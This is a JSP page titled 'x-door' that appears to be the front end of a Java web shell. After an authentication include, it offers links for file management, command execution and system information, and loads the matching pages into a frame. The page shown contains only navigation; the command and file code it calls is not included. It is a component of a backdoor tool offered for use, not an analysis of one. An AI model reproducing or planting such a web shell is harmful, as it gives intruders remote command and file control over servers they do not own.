<%@ page language="java" contentType="text/html; charset=UTF-8"
         pageEncoding="UTF-8"%>
<%@ include  file="auth.jsp"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>x-door</title>
    <script type="text/javascript">
        function menu(obj) {
            if ("file" == obj) {
                document.getElementById('main').src = "files.jsp";
            } else if ("com" == obj) {
                document.getElementById('main').src = "command.jsp";
            } else if ("sys" == obj) {
                document.getElementById('main').src = "sysinfo.jsp";
            }
        }
        function setWinHeight(obj)
        {
            var hr = obj.document.body.scrollHeight;
            var hl = obj.document.body.scrollHeight;
            var height = Math.max(hr,hl);
            obj.height = height;
        }
    </script>
</head>
<body style="overflow-x: hidden;">
<div style="height: 100%; width: 100%;">
<a href="#" onclick="menu('file'); return false;">文件管理</a>
<a href="#" onclick="menu('com'); return false;">命令执行</a>
<a href="#" onclick="menu('sys'); return false;">系统信息</a>

<iframe id="main" onload="Javascript:setWinHeight(this)"  src="sysinfo.jsp"
        width="100%" height="500" frameborder="no" border="0"
        marginwidth="0" marginheight="0" scrolling="yes" allowtransparency="yes"></iframe>
</div>
</body>
</html>
